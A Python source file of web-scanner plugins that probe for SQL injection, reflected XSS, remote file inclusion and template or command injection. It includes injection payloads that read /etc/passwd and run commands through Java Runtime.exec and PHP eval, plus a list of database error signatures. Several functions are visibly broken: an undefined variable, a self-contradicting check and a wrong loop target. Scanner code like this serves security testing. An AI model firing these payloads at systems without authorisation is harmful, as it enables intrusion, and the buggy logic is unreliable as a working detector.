#!/usr/bin/env python3
# encoding=utf-8
#codeby     道长且阻
#email      @ydhcui/QQ664284092


import re
import copy
from core.plugin import BaseHttpPlugin,BaseWebPlugin,BaseHostPlugin,brute

class dbms:
        DB2 = 'IBM DB2 database'
        MSSQL = 'Microsoft SQL database'
        ORACLE = 'Oracle database'
        SYBASE = 'Sybase database'
        POSTGRE = 'PostgreSQL database'
        MYSQL = 'MySQL database'
        JAVA = 'Java connector'
        ACCESS = 'Microsoft Access database'
        INFORMIX = 'Informix database'
        INTERBASE = 'Interbase database'
        DMLDATABASE = 'DML Language database'
        UNKNOWN = 'Unknown database'

class SQLInjection(BaseHttpPlugin):
    bugname = 'SQL注入漏洞'
    bugrank = '高危'

    def filter(self,crawle,req,res):
        return req.query or req.data

    def verify(self,crawle,req,res):
        return self.sqlinjection_headers(req,res)\
            or self.sqlinjection_int(req,res)   \
            or self.sqlinjection_str(req,res)   \
            or self.sqlinjection_error(req,res)

    def __init__(self):
        self.reqblock   = set()
        self.sql_errors = []
        errors = []
        #ASP / MSSQL [SqlException (0x80131904):
        errors.append(('System\.Data\.OleDb\.OleDbException', dbms.MSSQL ) )
        errors.append(('\\[SQL Server\\]', dbms.MSSQL ) )
        errors.append(('\\[Microsoft\\]\\[ODBC SQL Server Driver\\]', dbms.MSSQL ) )
        errors.append(('\\[SQLServer JDBC Driver\\]', dbms.MSSQL ) )
        errors.append(('\\[SqlException (0x80131904):', dbms.MSSQL ) )
        errors.append(('System.Data.SqlClient.SqlException', dbms.MSSQL ) )
        errors.append(('Unclosed quotation mark after the character string', dbms.MSSQL ) )
        errors.append(("'80040e14'", dbms.MSSQL ) )
        errors.append(('mssql_query\\(\\)', dbms.MSSQL ) )
        errors.append(('odbc_exec\\(\\)', dbms.MSSQL ) )
        errors.append(('Microsoft OLE DB Provider for ODBC Drivers', dbms.MSSQL))
        errors.append(('Microsoft OLE DB Provider for SQL Server', dbms.MSSQL))
        errors.append(('Incorrect syntax near', dbms.MSSQL ) )
        errors.append(('Sintaxis incorrecta cerca de', dbms.MSSQL ) )
        errors.append(('Syntax error in string in query expression', dbms.MSSQL ) )
        errors.append(('ADODB\\.Field \\(0x800A0BCD\\)<br>', dbms.MSSQL ) )
        errors.append(("Procedure '[^']+' requires parameter '[^']+'", dbms.MSSQL))
        errors.append(("ADODB\\.Recordset'", dbms.MSSQL))
        errors.append(("Unclosed quotation mark before the character string", dbms.MSSQL))
        # DB2
        errors.append(('SQLCODE', dbms.DB2 ) )
        errors.append(('DB2 SQL error:', dbms.DB2 ) )
        errors.append(('SQLSTATE', dbms.DB2 ) )
        errors.append(('\\[IBM\\]\\[CLI Driver\\]\\[DB2/6000\\]', dbms.DB2 ) )
        errors.append(('\\[CLI Driver\\]', dbms.DB2 ) )
        errors.append(('\\[DB2/6000\\]', dbms.DB2 ) )
        # Sybase
        errors.append(("Sybase message:", dbms.SYBASE ) )
        # Access
        errors.append(('Syntax error in query expression', dbms.ACCESS))
        errors.append(('Data type mismatch in criteria expression.', dbms.ACCESS))
        errors.append(('Microsoft JET Database Engine', dbms.ACCESS))
        errors.append(('\\[Microsoft\\]\\[ODBC Microsoft Access Driver\\]', dbms.ACCESS ) )
        # ORACLE
        errors.append(('(PLS|ORA)-[0-9][0-9][0-9][0-9]', dbms.ORACLE ) )
        # POSTGRE
        errors.append(('PostgreSQL query failed:', dbms.POSTGRE ) )
        errors.append(('supplied argument is not a valid PostgreSQL result', dbms.POSTGRE ) )
        errors.append(('pg_query\\(\\) \\[:', dbms.POSTGRE ) )
        errors.append(('pg_exec\\(\\) \\[:', dbms.POSTGRE ) )
        # MYSQL
        errors.append(('supplied argument is not a valid MySQL', dbms.MYSQL ) )
        errors.append(('Column count doesn\'t match value count at row', dbms.MYSQL ) )
        errors.append(('mysql_fetch_array\\(\\)', dbms.MYSQL ) )
        errors.append(('mysql_', dbms.MYSQL))
        errors.append(('on MySQL result index', dbms.MYSQL ) )
        errors.append(('You have an error in your SQL syntax;', dbms.MYSQL ) )
        errors.append(('You have an error in your SQL syntax near', dbms.MYSQL ) )
        errors.append(('MySQL server version for the right syntax to use', dbms.MYSQL ) )
        errors.append(('\\[MySQL\\]\\[ODBC', dbms.MYSQL))
        errors.append(("Column count doesn't match", dbms.MYSQL))
        errors.append(("the used select statements have different number of columns", dbms.MYSQL))
        errors.append(("Table '[^']+' doesn't exist", dbms.MYSQL))
        # Informix
        errors.append(('com\\.informix\\.jdbc', dbms.INFORMIX))
        errors.append(('Dynamic Page Generation Error:', dbms.INFORMIX))
        errors.append(('An illegal character has been found in the statement', dbms.INFORMIX))
        errors.append(('<b>Warning</b>:  ibase_', dbms.INTERBASE))
        errors.append(('Dynamic SQL Error', dbms.INTERBASE))
        # DML
        errors.append(('\\[DM_QUERY_E_SYNTAX\\]', dbms.DMLDATABASE))
        errors.append(('has occurred in the vicinity of:', dbms.DMLDATABASE))
        errors.append(('A Parser Error \\(syntax error\\)', dbms.DMLDATABASE))
        # Java
        errors.append(('java\\.sql\\.SQLException', dbms.JAVA))
        errors.append(('Unexpected end of command in statement', dbms.JAVA))
        # Coldfusion
        errors.append(('\\[Macromedia\\]\\[SQLServer JDBC Driver\\]', dbms.MSSQL))
        # Generic errors..
        errors.append(('SELECT .*? FROM .*?', dbms.UNKNOWN))
        errors.append(('UPDATE .*? SET .*?', dbms.UNKNOWN))
        errors.append(('INSERT INTO .*?', dbms.UNKNOWN))
        errors.append(('Unknown column', dbms.UNKNOWN))
        errors.append(('where clause', dbms.UNKNOWN))
        errors.append(('SqlServer', dbms.UNKNOWN))
        #  compile them and save that into self.sql_errors.
        for re_string, dbms_type in errors:
            self.sql_errors.append((re.compile(re_string, re.IGNORECASE), dbms_type))

    def sqlinjection_int(self,req,res):
        '''数字型注入'''
        req = copy.deepcopy(req)
        for k,v in req.query.items():
            if not v.isdigit():
                continue
            req.query[k] = v+'+1'
            res1 = req.response()
            req.query[k] = v+'+1-1'
            res2 = req.response()
            if res.text == res2.text and res1.text != res2.text:
                self.bugaddr = req.url
                self.bugreq = str(req)
                return True
            req.query[k] = v

        for k,v in req.data.items():
            if not v.isdigit():
                continue
            req.data[k] = v+'+1'
            res1 = req.response()
            req.data[k] = v+'+1-1'
            res2 = req.response()
            if res.text == res2.text and res1.text != res2.text:
                self.bugaddr = req.url
                self.bugreq = str(req)
                return True
            req.data[k] = v

    def sqlinjection_str(self,req,res):
        '''字符型注入'''
        req = copy.deepcopy(req)
        QUOTES = ("'",'"')
        PAYLOADS = [
            (" and '1'='2",      " and '1'='1"),
            #("/**/and/**/0;#",  "/**/and/**/1;#"),
            #("\tand\t0;#",      "\tand\t1;#"),
            #("\nand/**/0;#",    "\nand/**/1;#"),
        ]
        for k,v in req.query.items():
            for q in QUOTES:
                for p1,p2 in PAYLOADS:
                    req.query[k] = v+q+p1.replace("'",q)
                    res1 = req.response()
                    req.query[k] = v+q+p2.replace("'",q)
                    res2 = req.response()
                    if res.text == res2.text and res1.text != res2.text:
                        self.bugaddr = req.url
                        self.bugreq = str(req)
                        return True
            req.query[k] = v

        for k,v in req.data.items():
            for q in QUOTES:
                for p1,p2 in PAYLOADS:
                    req.data[k] = v+q+p1
                    res1 = req.response()
                    req.data[k] = v+q+p2
                    res2 = req.response()
                    if res.text == res2.text and res1.text != res2.text:
                        self.bugaddr = req.url
                        self.bugreq = str(req)
                        return True
            req.data[k] = v

    def sqlinjection_error(self,req,res):
        '''报错注入'''
        req = copy.deepcopy(req)
        for k,v in req.query.items():
            if not v:
                v = 'sqlinjectiontest'
            req.query[k] = v
        for k,v in req.query.items():
            if not v:
                v = 'sqlinjectiontest'
            req.query[k] = v+"'"
            res1 = req.response()
            req.query[k] = v+'"'
            res2 = req.response()
            for sql_regex, dbms_type in self.sql_errors:
                match0 = sql_regex.search(res.text)
                match1 = sql_regex.search(res1.text)
                match2 = sql_regex.search(res2.text)
                if((not match0)and(match1))or((req.query[k] in res1.text)and(req.query[k] not in res.text)):
                    self.bugaddr = req.url
                    self.bugreq = str(req)
                    self.bugres = match1.group(0)
                    return True
                elif(not match0)and(match2)or((req.query[k] in res2.text)and(req.query[k] not in res.text)):
                    self.bugaddr = req.url
                    self.bugreq = str(req)
                    self.bugres = match2.group(0)
                    return True
            req.query[k] = v
        for k,v in req.data.items():
            if not v:
                v = 'sqlinjectiontest'
            req.data[k] = v
        for k,v in req.data.items():
            if not v:
                v = 'sqlinjectiontest'
            req.data[k] = v+"'"
            res1 = req.response()
            req.data[k] = v+'"'
            res2 = req.response()
            for sql_regex, dbms_type in self.sql_errors:
                match0 = sql_regex.search(res.text)
                match1 = sql_regex.search(res1.text)
                match2 = sql_regex.search(res2.text)
                if((not match0)and(match1))or((req.query[k] in res1.text)and(req.query[k] not in res.text)):
                    self.bugaddr = req.url
                    self.bugreq = str(req)
                    self.bugres = match1.group(0)
                    return True
                elif(not match0)and(match2)or((req.query[k] in res2.text)and(req.query[k] not in res.text)):
                    self.bugaddr = req.url
                    self.bugreq = str(req2)
                    self.bugres = match2.group(0)
                    return True
            req.data[k] = v

    def sqlinjection_headers(self,req,res):
        '''请求头部注入'''
        req = copy.deepcopy(req)
        req.headers['Referer'] += "'"
        req.headers['User-Agent'] += "'"
        req.headers['X-Forwarded-For'] = "127.0.0.1'"
        req.headers['X-Client-Ip'] = "127.0.0.1'"
        res1 = req.response()
        for sql_regex, dbms_type in self.sql_errors:
            match0 = sql_regex.search(res.text)
            match1 = sql_regex.search(res1.text)
            if(not match0)and(match1):
                self.bugaddr = req.url
                self.bugreq = str(req)
                self.bugres = match1.group(0)
                return True

class XssScripting(BaseHttpPlugin):
    PAYLOADS = [
        ('''<onxssTEST>''', re.compile(r'''[^'"]<onxssTEST>[^'"]''')),
        ('''"onxssTEST"''', re.compile(r'''[^']"onxssTEST""''')),
        ("""'onxssTEST'""", re.compile(r"""[^"]'onxssTEST''""")),
    ]

    bugname = 'XSS跨站脚本'
    bugrank = '高危'

    def filter(self,crawle,req,res):
        return req.query or req.data

    def verify(self,crawle,req,res):
        '''
        存储型XSS貌似没办法扫描到
        '''
        req = copy.deepcopy(req)
        for p,r in self.PAYLOADS:
            for k,v in req.query.items():
                req.query[k] = p
                res = req.response()
                r = r.search(res.text)
                if r:
                    x,y = r.regs[0]
                    self.bugaddr = req.url
                    self.bugreq = str(req)
                    self.bugres = res.text[x-5:y+5]
                    return True
                req.query[k] = v

            for k,v in req.data.items():
                req.data[k] = p
                res = req.response()
                r = r.search(res.text)
                if r:
                    x,y = r.regs[0]
                    self.bugaddr = req.url
                    self.bugreq = str(req)
                    self.bugres = res.text[x-5:y+5]
                    return True
                req.data[k] = v

class RemoteFileInclude(BaseHttpPlugin):
    PAYLOADS = ("HTTP://WWW.BAIDU.COM","//www.baidu.com")

    bugname = 'RFI 远程文件包含'
    bugrank = '高危'

    def filter(self,crawle,req,res):
        return 'PHP' in crawle.website.content

    def verify(self,crawle,req,res):
        req = copy.deepcopy(req)
        for k,v in req.query.items():
            req.query[k] = p
            if req in self.reqblock:
                continue
            self.reqblock.append(req)
            req.query[k] = self.PAYLOADS[0]
            res1 = req.response()
            if(self.PAYLOADS[1] in res1.text)and(self.PAYLOADS[1] not in res1.text):
                self.bugaddr = req.url
                self.bugreq = str(req)
                return True
            req.query[k] = v

        for k,v in req.data.items():
            req.data[k] = p
            if req in self.reqblock:
                continue
            self.reqblock.append(req)
            req.data[k] = self.PAYLOADS[0]
            res1 = req.response()
            if(self.PAYLOADS[1] in res1.text)and(self.PAYLOADS[1] not in res1.text):
                self.bugaddr = req.url
                self.bugreq = str(req)
                return True
            req.data[k] = v

class Sstif(BaseHttpPlugin):
    bugname = "模板注入"
    bugrank = "高危"

    def __init__(self):
        self.checkkey_list = ['646744516', '/sbin/nologin', '/bin/bash']
        payloads_list = []
        payloads_list.append("cat</etc/passwd")
        payloads_list.append("`cat</etc/passwd`")
        payloads_list.append("`cat$IFS/etc/passwd`")
        payloads_list.append('''";/bin/cat</etc/passwd;"''')
        payloads_list.append("10516*61501")
        payloads_list.append("{{10516*61501}}")
        payloads_list.append("${10516*61501}")
        payloads_list.append("#{10516*61501}")
        payloads_list.append("${@eval%2810516*61501%29}")
        payloads_list.append("${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\u002710516*61501\u0027).getInputStream())}")
        payloads_list.append("{php}echo 10516*61501;{/php}")
        payloads_list.append("${${eval(10516*61501)}}")
        payloads_list.append("$%7B$%7Beval(10516*61501)%7D%7D")
        payloads_list.append("<?php echo 10516*61501;?>")
        payloads_list.append("<? echo 10516*61501;?>")
        payloads_list.append("<SCRIPT LANGUAGE='php'>echo 10516*61501;</SCRIPT>")
        payloads_list.append("<% echo 10516*61501; %>")
        payloads_list.append('''${new%20java.lang.String(new%20byte[]{54,52,54,55,52,52,53,49,54})}''')
        payloads_list.append('''${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat</etc/passwd').getInputStream())}''')
        self.payloads_list = payloads_list

    def filter(self,crawle,req,res):
        return (req.query or req.data)and(not req.path.endswith(('.js','.css')))

    def verify(self,crawle,req,res):
        req = copy.deepcopy(req)
        for p in self.payloads_list:
            for k,v in req.query.items():
                req.query[k] = p
                res1 = req.response()
                for r in self.checkkey_list:
                    if r not in res.text and r in res1.text:
                        self.bugaddr = req.url
                        self.bugreq = str(req)
                        self.bugres = r
                        return True
                req.query[k] = v

            for k,v in req.data.items():
                req.data[k] = p
                res1 = req.response()
                for r in self.checkkey_list:
                    if r not in res.text and r in res1.text:
                        self.bugaddr = req.url
                        self.bugreq = str(req)
                        self.bugres = r
                        return True
                req.data[k] = v

            #req.url = p



